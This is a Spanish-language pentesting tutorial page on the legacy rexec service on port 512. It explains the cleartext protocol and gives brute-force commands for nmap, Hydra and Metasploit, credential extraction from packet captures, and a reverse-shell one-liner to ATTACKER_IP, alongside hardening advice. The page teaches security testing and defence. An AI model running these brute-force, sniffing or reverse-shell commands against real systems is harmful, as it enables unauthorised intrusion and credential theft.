# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Informaci√≥n B√°sica

Rexec (remote **exec**) es uno de los servicios originales de la suite Berkeley *r* (junto con `rlogin`, `rsh`, ‚Ä¶). Proporciona una capacidad de **ejecuci√≥n de comandos remotos** **autenticada solo con un nombre de usuario y contrase√±a en texto claro**. El protocolo fue definido a principios de la d√©cada de 1980 (ver RFC 1060) y hoy en d√≠a se considera **inseguro por dise√±o**. Sin embargo, todav√≠a est√° habilitado por defecto en algunos equipos UNIX / conectados a la red heredados y ocasionalmente aparece durante las pruebas internas de pentesting.

**Puerto por Defecto:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> üî• Todo el tr√°fico, incluidos las credenciales, se transmite **sin cifrar**. Cualquiera con la capacidad de espiar la red puede recuperar el nombre de usuario, la contrase√±a y el comando.

### Vista r√°pida del protocolo

1. El cliente se conecta al TCP 512.
2. El cliente env√≠a tres cadenas **terminadas en NUL**:
* el n√∫mero de puerto (como ASCII) donde desea recibir stdout/stderr (a menudo `0`),
* el **nombre de usuario**,
* la **contrase√±a**.
3. Se env√≠a una cadena final terminada en NUL con el **comando** a ejecutar.
4. El servidor responde con un solo byte de estado de 8 bits (0 = √©xito, `1` = fallo) seguido de la salida del comando.

Eso significa que puedes reproducir el intercambio con nada m√°s que `echo -e` y `nc`:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
Si las credenciales son v√°lidas, recibir√°s la salida de `id` directamente en la misma conexi√≥n.

### Uso manual con el cliente

Muchas distribuciones de Linux a√∫n incluyen el cliente legado dentro del paquete **inetutils-rexec** / **rsh-client**:
```bash
rexec -l user -p password <target> "uname -a"
```
Si se omite `-p`, el cliente solicitar√° interactivamente la contrase√±a (¬°visible en la red en texto claro!).

---
## Enumeraci√≥n y Fuerza Bruta

### [**Fuerza bruta**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
El `rexec-brute` NSE utiliza el protocolo descrito arriba para intentar credenciales muy r√°pidamente.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` tiene un m√≥dulo **rexec** dedicado y sigue siendo el bruteforcer offline m√°s r√°pido. `medusa` (`-M REXEC`) y `ncrack` (m√≥dulo `rexec`) se pueden usar de la misma manera.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
El m√≥dulo generar√° un shell con √©xito y almacenar√° las credenciales en la base de datos.

---
## Captura de credenciales

Debido a que todo est√° en texto claro, **las capturas de red son invaluables**. Con una copia del tr√°fico, puedes extraer credenciales sin tocar el objetivo:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark, habilite *Decode As ‚Ä¶‚Äã* TCP 512 ‚Üí REXEC para ver campos bien analizados.)

---
## Consejos de Post-Explotaci√≥n

* Los comandos se ejecutan con los privilegios del usuario proporcionado. Si `/etc/pam.d/rexec` est√° mal configurado (por ejemplo, `pam_rootok`), a veces son posibles shells de root.
* Rexec ignora el shell del usuario y ejecuta el comando a trav√©s de `/bin/sh -c <cmd>`. Por lo tanto, puede utilizar trucos t√≠picos de escape de shell (`;`, ``$( )``, comillas invertidas) para encadenar m√∫ltiples comandos o generar shells reversos:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Las contrase√±as a menudo se almacenan en **~/.netrc** en otros sistemas; si compromete un host, puede reutilizarlas para movimiento lateral.

---
## Dureza / Detecci√≥n

* **No exponga rexec**; reempl√°celo con SSH. Pr√°cticamente todos los *inetd* superservidores modernos comentan el servicio por defecto.
* Si debe mantenerlo, restrinja el acceso con envolturas TCP (`/etc/hosts.allow`) o reglas de firewall y haga cumplir contrase√±as fuertes por cuenta.
* Monitoree el tr√°fico hacia :512 y los lanzamientos de procesos `rexecd`. Una sola captura de paquetes es suficiente para detectar un compromiso.
* Desactive `rexec`, `rlogin`, `rsh` juntos: comparten la mayor parte de la misma base de c√≥digo y debilidades.

---

## Referencias

* Documentaci√≥n de Nmap NSE `rexec-brute` ‚Äì [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* M√≥dulo de Rapid7 Metasploit `auxiliary/scanner/rservices/rexec_login` ‚Äì [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
